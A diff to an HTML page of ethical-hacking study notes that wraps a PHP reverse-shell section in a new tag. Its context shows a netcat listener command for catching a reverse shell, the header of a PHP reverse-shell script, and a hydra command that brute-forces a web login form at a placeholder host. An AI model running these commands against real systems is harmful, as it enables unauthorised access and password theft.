@@ -14,6 +14,7 @@ while I am studing ethical hacking I will add usefull commands and scripts
 </ul>
 
 <h4>php reverse shell  script </h4>
+<reverse>
 <p>nc -lvnp 1234</p>
 <pre><?php
     // php-reverse-shell - A Reverse Shell implementation in PHP
@@ -206,6 +207,7 @@ while I am studing ethical hacking I will add usefull commands and scripts
     
     ?> 
     </pre>
+    </reverse>
     <h4>hydra</h4>
     <p>hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V</p>
 </body>
